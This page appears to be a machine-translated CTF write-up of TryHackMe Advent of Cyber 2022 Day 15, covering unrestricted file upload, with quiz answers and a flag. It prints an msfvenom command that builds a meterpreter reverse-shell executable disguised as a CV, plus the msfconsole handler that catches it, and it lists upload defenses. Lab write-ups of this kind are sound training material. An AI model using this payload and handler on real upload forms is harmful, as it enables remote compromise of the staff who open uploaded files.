<html>
<head>
<title>Advent of Cyber 2022 [Day 15] Secure Coding | Santa is looking for a Sidekick | Simple Write up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">赛博2022的来临[第15天]安全编码|圣诞老人正在寻找一个助手|简单的书面记录</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/advent-of-cyber-2022-day-15-secure-coding-santa-is-looking-for-a-sidekick-simple-write-up-60fe902423ef?source=collection_archive---------2-----------------------#2022-12-16">https://infosecwriteups.com/advent-of-cyber-2022-day-15-secure-coding-santa-is-looking-for-a-sidekick-simple-write-up-60fe902423ef?source=collection_archive---------2-----------------------#2022-12-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="1ffc" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">任务20答案—赛博2022的来临[第15天] <strong class="ak">安全编码</strong>圣诞老人正在寻找一个由Karthikeyan Nagaraj撰写的助手</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi kf"><img src="../Images/d78e5586fc19141e7cee052f25625a65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1296/format:webp/1*7oewi5y20CcJORoGb0QWfg.png"/></div></figure><h1 id="8fe2" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">输入验证</h1><blockquote class="lf lg lh"><p id="6a94" class="li lj lk ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="iq">输入验证不足是web应用程序最大的安全隐患之一。当用户提供的输入受到应用程序的固有信任时，就会出现此问题。由于用户输入也可能被攻击者控制，我们可以看到这种固有的信任是如何导致许多问题的。</em></p><p id="a7a4" class="li lj lk ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="iq">多个web应用漏洞，如SQL注入、跨站脚本、无限制文件上传等，都源于用户输入验证不充分的问题。</em></p></blockquote><p id="34d2" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">启动机器，将机器的IP粘贴到浏览器中！</p><blockquote class="lf lg lh"><p id="e1a1" class="li lj lk ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果需要，连接TryHackMe的VPN</p></blockquote><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mi"><img src="../Images/afd213ac13fcef255f616d2631ab305b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UISyMxupEKuMTPdGnZpuDQ.png"/></div></div></figure><h1 id="7f19" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">圣诞老人正在寻找一个助手</h1><h2 id="67c4" class="mn ko iq bd kp mo mp dn kt mq mr dp kx mf ms mt kz mg mu mv lb mh mw mx ld my bi translated">1.允许威胁参与者上传他们想要的任何文件的文件上传的名称是什么？</h2><p id="32b2" class="pw-post-body-paragraph li lj iq ll b lm mz jr lo lp na ju lr mf nb lu lv mg nc ly lz mh nd mc md me ij bi translated">利用对服务器的<strong class="ll ir"><em class="lk"/></strong>无限制上传访问权限(以及随意检索数据的能力)，攻击者可以篡改或以其他方式更改现有内容——甚至包括注入恶意网页，从而导致进一步的漏洞，如跨站脚本(XSS)或跨站请求伪造(CSRF)</p><pre class="kg kh ki kj gt ne nf ng bn nh ni bi"><span id="5a8d" class="nj ko iq nf b be nk nl l nm nn">Ans: Unrestricted</span></pre><h2 id="1dfb" class="mn ko iq bd kp mo mp dn kt mq mr dp kx mf ms mt kz mg mu mv lb mh mw mx ld my bi translated">2.圣诞老人的自由职业者开发的web应用程序的标题是什么？</h2><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi no"><img src="../Images/1cd9c81c41fed8e05aa4d2938310736a.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/1*kXxzGUfv1TBHqnFougsyuA.png"/></div></figure><pre class="kg kh ki kj gt ne nf ng bn nh ni bi"><span id="40e9" class="nj ko iq nf b be nk nl l nm nn">Ans: Santasidekick2</span></pre><h2 id="654b" class="mn ko iq bd kp mo mp dn kt mq mr dp kx mf ms mt kz mg mu mv lb mh mw mx ld my bi translated">3.HR Elf的Documents目录中存储的标志值是多少？</h2><p id="e7f4" class="pw-post-body-paragraph li lj iq ll b lm mz jr lo lp na ju lr mf nb lu lv mg nc ly lz mh nd mc md me ij bi translated">只需上传一个虚拟文件！！</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi np"><img src="../Images/a2677f13371fae4ac07be8767a7d74e0.png" data-original-src="https://miro.medium.com/v2/resize:fit:896/format:webp/1*p5lMJylZq2Ua1Keof_a_cA.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nq"><img src="../Images/33385a3b285d7d7806e331cb0c104e8e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9_IFLdKYyJggPM300iIb-Q.png"/></div></div></figure><blockquote class="lf lg lh"><p id="4724" class="li lj lk ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><strong class="ll ir"><em class="iq">cv-username.exe简历文件上传完毕！！圣诞老人团队会审核你的简历并联系你！因为Santa相信强大的安全性，所以文件被存储在web根目录之外。不允许有不道德的精灵！</em>T15】</strong></p></blockquote><p id="0cc4" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">上面的消息确保有人会检查文件，所以我们可以上传一个有效负载并等待交互</p><pre class="kg kh ki kj gt ne nf ng bn nh ni bi"><span id="9a39" class="nj ko iq nf b be nk nl l nm nn">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;YOUR-MACHINE-IP&gt; LPORT=8080 -f exe -o cv-username.exe</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/468d9ca27b1a2c37026ab3fa33e46574.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/1*CSb-FmJ35gJDIeA3PZY81w.png"/></div></figure><p id="8869" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">让我们启动反向处理器！！</p><pre class="kg kh ki kj gt ne nf ng bn nh ni bi"><span id="5bff" class="nj ko iq nf b be nk nl l nm nn">sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST &lt;YOUR-MACHINE-IP&gt;; set LPORT 8080; exploit"</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/e2d73284fbc58916f456c4e0aa4db195.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/1*5-XSxuS98ckSICM4vV9c2w.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/ec5a5976deb1b8e7d50d9abb2cabbf32.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/1*H9rYnnL0kY7uikkIe68leA.png"/></div></figure><p id="2dd9" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">让我们将我们在Home Directory中创建的有效负载上传到网站，然后等待交互！！</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/1badad830924f624296645237ebf7979.png" data-original-src="https://miro.medium.com/v2/resize:fit:918/format:webp/1*VItAdDhA0SdlnWiC5pNgQQ.png"/></div></figure><p id="513c" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">我们得到了反向连接！！</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/8b7c03a998ea7b20a8568c4de3997a5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1304/format:webp/1*1eI-bULUICyNg9ERzvH4PA.png"/></div></figure><p id="4cec" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">现在让我们利用</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi np"><img src="../Images/3dd0bc1bffeb942bd27465e72ead30bc.png" data-original-src="https://miro.medium.com/v2/resize:fit:896/format:webp/1*pW1jJ4YTIfA5yITHhw7jjw.png"/></div></figure><p id="8ed9" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">我们在system32目录中，所以让我们回到C:目录</p><pre class="kg kh ki kj gt ne nf ng bn nh ni bi"><span id="662c" class="nj ko iq nf b be nk nl l nm nn">cd ..<br/>cd .. <br/>cd Users<br/>cd HR_Elf<br/>cd Documents<br/>cat flag.txt</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/2325db98be53f15184199b26228c8762.png" data-original-src="https://miro.medium.com/v2/resize:fit:844/format:webp/1*s-e8N6TnuR7oOrJF-wpo0A.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nv"><img src="../Images/e69d54040438fe8462a03d37d517613d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3M4hTEpEKYEi45Z2DL1Cdg.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/886cd5bf38a0f7393b5d2b0880dd1202.png" data-original-src="https://miro.medium.com/v2/resize:fit:1162/format:webp/1*iscxLmBNQc-y2SpVSJHaGQ.png"/></div></figure><pre class="kg kh ki kj gt ne nf ng bn nh ni bi"><span id="d4da" class="nj ko iq nf b be nk nl l nm nn">Ans: THM{Naughty.File.Uploads.Can.Get.You.RCE}</span></pre><h2 id="2560" class="mn ko iq bd kp mo mp dn kt mq mr dp kx mf ms mt kz mg mu mv lb mh mw mx ld my bi translated">4.可以实施什么防御技术来确保特定类型的文件可以上传？</h2><blockquote class="lf lg lh"><p id="fa3f" class="li lj lk ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="iq">为了确保可以上传特定的文件类型，我们可以验证文件扩展名。这将允许我们限制可以上传的文件类型。</em></p></blockquote><pre class="kg kh ki kj gt ne nf ng bn nh ni bi"><span id="7b75" class="nj ko iq nf b be nk nl l nm nn">Ans: file Extension validation</span></pre><h2 id="0f5d" class="mn ko iq bd kp mo mp dn kt mq mr dp kx mf ms mt kz mg mu mv lb mh mw mx ld my bi translated">5.可以使用什么防御技术来确保威胁参与者无法通过简单地使用文件名再次恢复他们的文件？</h2><p id="0b17" class="pw-post-body-paragraph li lj iq ll b lm mz jr lo lp na ju lr mf nb lu lv mg nc ly lz mh nd mc md me ij bi translated">即使我们的上传存储在web根目录之外，攻击者也可以利用其他漏洞(如文件包含)来执行文件。</p><p id="b97f" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">为了对抗这些企图，我们可以将<strong class="ll ir"> <em class="lk">重命名</em> </strong>上传的文件随机命名，使得攻击者几乎不可能通过名字来恢复他们的文件</p><pre class="kg kh ki kj gt ne nf ng bn nh ni bi"><span id="a840" class="nj ko iq nf b be nk nl l nm nn">Ans: File Renaming</span></pre><h2 id="f907" class="mn ko iq bd kp mo mp dn kt mq mr dp kx mf ms mt kz mg mu mv lb mh mw mx ld my bi translated">6.什么样的防御技术可以用来确保伤害精灵的恶意文件不会被上传？</h2><p id="cf27" class="pw-post-body-paragraph li lj iq ll b lm mz jr lo lp na ju lr mf nb lu lv mg nc ly lz mh nd mc md me ij bi translated">仍然存在攻击者上传恶意文件的风险，该文件的目标是审核CVs的精灵。由于圣诞老人是一个高价值的个体，一些民族国家甚至可能使用PDF阅读器中发现的专门漏洞来上传恶意PDF，希望能够将自己从圣诞老人的淘气名单中删除！</p><p id="ecdf" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">为了打击这些类型的恶意文件，我们可以通过<strong class="ll ir"> <em class="lk">扫描上传文件中的恶意软件</em> </strong>。我们可以安装一个包，比如ClamAV，用它来扫描每个上传文件的内容</p><pre class="kg kh ki kj gt ne nf ng bn nh ni bi"><span id="ddab" class="nj ko iq nf b be nk nl l nm nn">  Ans: Malware Scanning</span></pre></div><div class="ab cl nx ny hu nz" role="separator"><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc"/></div><div class="ij ik il im in"><p id="7c1d" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">感谢您的阅读！！</p><p id="0561" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">黑客快乐~</p><pre class="kg kh ki kj gt ne nf ng bn nh ni bi"><span id="6bf5" class="nj ko iq nf b be nk nl l nm nn">Author : Karthikeyan Nagaraj ~ Cyberw1ng</span></pre><p id="71fb" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">查询:</p><p id="877e" class="pw-post-body-paragraph li lj iq ll b lm ln jr lo lp lq ju lr mf lt lu lv mg lx ly lz mh mb mc md me ij bi translated">THM，TryHackMe，TryHackMe 2022年网络时代的到来，TryHackMe 2022年网络时代的到来第15天，道德黑客，写，走过，TryHackMe 2022年网络时代的到来第15天答案</p></div><div class="ab cl nx ny hu nz" role="separator"><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc"/></div><div class="ij ik il im in"><h2 id="7d53" class="mn ko iq bd kp mo mp dn kt mq mr dp kx mf ms mt kz mg mu mv lb mh mw mx ld my bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae oe" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周时事通讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>